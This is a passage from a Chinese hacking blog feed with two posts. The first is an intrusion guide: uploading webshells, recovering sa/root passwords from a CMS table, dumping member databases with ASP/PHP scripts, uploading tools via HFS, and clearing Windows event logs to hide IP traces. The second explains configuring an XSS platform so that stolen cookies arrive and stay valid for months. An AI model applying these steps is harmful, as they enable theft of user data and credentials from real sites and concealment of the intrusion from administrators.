登录即可<br>接下来传shell大家应该都会了。<br>接下来说提权 hostcs表存有sa root账户的密码 解密方法一样。默认都是 解密结果123456<br>还有就是在adminlogo 存在N点系统管理密码 30位的cfs加密可以在<a href="http://www.md5.com.cn/cfs" target="_blank" rel="external">http://www.md5.com.cn/cfs</a> 碰撞下试试 或者用asm的工具破解下我的运气不好没成功过<br>3057C0DB854C878E72756088058775 这个是默认admin的密码</p>
<p>(( 拖库 ))<br>access数据库脱裤很简单，直接下载数据库即可，mssql数据库可以用shell自带的脱裤功能，也可以用asp脱裤脚本，找到数据库连接信息的文件，例如：web.config.asp<br>用帐号密码登录asp脱裤脚本，找到管理表，再找到会员库（UserInfo），之后导出即可，mysql数据库一般用php脚本，找网站数据连接信息：<br>‘host’ =&gt; ‘localhost:3306′, 数据库ip<br>‘user’ =&gt; ‘iwebs’, 用户<br>‘passwd’ =&gt; ‘nnY5bvRNnJ4vKpmb’, 密码<br>‘name’ =&gt; ‘iwebshop’, 数据库名<br>接着上传php脱裤脚本，进入拖库界面之后，左边有一个选择数据库名的选项，这里是iwebshop，选择数据库名之后，就会出现列表，想脱哪个就点击哪个，然后点击select data<br>Import是导入的意思，而Export是导出的意思，我们在拖库，当然是选择Export了，之后选择save，再点击Export就开始脱裤了。<br>如果服务器上安装了phpmysql，也可以找到该页面，用刚找到的root账号密码登录进去，在里面也是可以拖库的，如同上传php拖库脚本一样，操作差不多的。</p>
<p>(( 服务器 ))<br>命令提示符已被系统管理员停用？<br>解决方法：运行→gpedit.msc→用户配置→管理模板→系统，在右侧找到”阻止命令提示符”, 然后双击一下,在”设置”里面选中”未配置” ,最后点击”确定”。</p>
<p>如何判断服务器的类型？<br>解决方法：直接ping服务器ip，看回显信息进行判断<br>TTL=32 9X/ME<br>TTL=64 linux<br>TTL=128 2000X/XP<br>TTL=255 UNIX</p>
<p>为什么有时3389开放却不能连接？<br>原因分析：有时候是因为防火墙，把3389转发到其他端口就可以连接了，有的转发后依然是连接不上，那是因为管理员在TCP/IP里设置的端口限制<br>解决方法：我们需要把端口转为TCP/IP里设置的只允许连接的端口其中一个就可以了，更好的办法是取消端口限制。</p>
<p>最简单的往服务器上传东西方法是什么？<br>本机打开“HFS网络文件服务器”这款工具，把需要上传的工具直接拖进左边第一个框内，复制上面的地址，到服务器里的浏览器访问，就可以下载了</p>
<p>限制“命令提示符”的运行权限？<br>我的电脑（右键）–资源管理器中–点击“工具”按钮，选择“文件夹选项”，切换到“查看”标签，去掉“使用简单文件共享(推荐)”前面的钩，这一步是为了让文件的属性菜单中显示“安全”标签，然后进入“c:windowssystem32”，找到“cmd.exe”，点右键选择“属性”，切换到“安全”标签，将其中“组或用户名称”中除了管理员外的所有用户都删除，完成后点“确定”这样当普通用户想运行“命令提示符”的时候将会出现“拒绝访问”的警告框。</p>
<p>如何更改windows2003最大连接数？<br>windows2003中的远程桌面功能非常方便，但是初始设置只允许2个用户同时登陆，有些时候因为我在公司连接登陆后断开，同事在家里用其他用户登陆后断开，当我再进行连接的时候，总是报错“终端服务超过最大连接数”这时候我和同事都不能登陆，通过以下方法来增加连接数，运行：services.msc，启用license logging，别忘了添加完毕后再关闭 License Logging<br>打开win2k3的控制面板中的“授权”，点“添加许可”输入要改的连接数</p>
<p>如何清除服务器里的IP记录日志？<br>1.我的电脑右键管理–事件查看器–安全性–右键清除所有事件<br>2.打开我的电脑–C盘–WINDOWS–system32–config–AppEvent.Evt属性–安全–全部都拒绝<br>3.Klaklog.evt属性–安全–全部都拒绝–SecEvent.Tvt属性–安全–全部都拒绝</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[xss平台不能收信解决]]></title>
      <url>http://www.linux52.com/2014-12-18-xss-e5-b9-b3-e5-8f-b0-e4-b8-8d-e8-83-bd-e6-94-b6-e4-bf-a1-e8-a7-a3-e5-86-b3.html</url>
      <content type="html"><![CDATA[<p>纠结了一天 以前用的是centos 腾讯云架设 收信没问题</p>
<p>为了保持keepsion 还得浪费买一台vps 特别不划算  所以打算2003</p>
<p>平台下装一个</p>
<p>iis装着老是收不到信 各种查好麻烦</p>
<p>后来用phpstudy 架设完全正常收信也可以 cookies长期保持 哈 我的一些cookies 都长达半年不掉</p>
<p>&nbsp;</p>
<p>这里说下phpstudy 一些细点</p>
<p>收信 必须开启php的 pd_openssl sendmail</p>
<p><a href="http://dg2016.duapp.com/wp-content/uploads/2014/12/45.jpg" target="_blank" rel="external"><img src="http://dg2016.duapp.com/wp-content/uploads/2014/12/45-141x300.jpg" alt="45"></a></p>
<p>这样就能正常收信了</p>
<p>原因就是 发信是ssl phpmailer函数要sendmail支持</p>
<p>小伙伴们赶快去架设吧</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
]]></content>
    </entry>
    
  
  
</search>
